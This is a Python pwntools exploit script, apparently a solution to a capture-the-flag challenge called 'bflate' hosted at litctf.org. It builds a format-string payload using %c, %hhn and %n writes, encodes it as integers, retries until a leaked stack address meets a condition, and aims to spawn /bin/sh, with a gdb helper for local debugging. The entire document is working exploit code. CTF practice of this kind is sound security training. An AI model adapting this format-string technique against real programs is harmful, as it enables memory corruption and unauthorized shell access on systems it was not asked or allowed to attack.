#!/usr/bin/python3

from pwn import *
import time
import psutil
import signal,sys
def handle(signum, frame):
    sys.exit(0)
exe = ELF('bflate', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())
context.terminal = ['foot']
check = 1
def gdbs():
  if not args.REMOTE:
    gdb.attach(p, gdbscript='''
    b*main+314
    c
    b*printf
    c
    set $save_rsp = $rsp
    if ((char)$rsp != 0x68)
        kill
        q
    end
    set logging on
    echo \nbefore \n
    x/gx $save_rsp + (19-6)*8
    continue
    echo \nafter \n
    x/gx $save_rsp + (19-6)*8
    set logging off
    !mv gdb.txt log   ''')
    # input()

while True:
    try:
      if args.REMOTE:
          p = remote('litctf.org', 31775)
      else:
          p = process(exe.path)
      payload = b''
      payload += b'AAAA'
      payload += b'%c'*7 + b'%p'      # Print msort_param address out to check faster
      payload += b'%c'*8
      payload += f'%{0x50-13}c%hhn'.encode()
      payload += b'%c'*12
      payload += f'%{0xc4}c%hhn'.encode()
      payload += f'%*c%{0xf02b - 0x130}c%n;/bin/sh;'.encode()

      payload = payload.ljust(1000 , b'\0' )
      parts = b''
      part_count = 0
      for i in range(0, len(payload), 4):
        part_count += 1
        parts += str(u32(payload[i:i+4])).encode() + b' '

      sln(b'ints?\n', part_count)
      sl(parts)
      # gdbs()
      sl(b'-9')
      try:
          p.recvuntil(b'0x')
          addr = int(p.recv(12), 16)
          if addr & 0xff != 0x20:         # We are aiming that msort_param ends with 0x20
            print("Invalid address!")
            p.close()
            continue
          else:
            print("Maybe correct address")
            gdbs()
      except:
          print("run again if the address is not satisfied")
      try:
        done = 0
        res = p.recv(1024)
        res_bak = res
        while True:
          res = p.recv(1024)
          res_bak += res
          if b';/bin/sh;' in res_bak:
            done = 1
            break
          res_bak = res_bak[1024:]
        if done:
          break
      except:
        try:
          p.close()
        except KeyboardInterrupt:
          print("Script terminated by user.")
          sys.exit(0)
    except KeyboardInterrupt:
      print("Script terminated by user.")
      sys.exit(0)
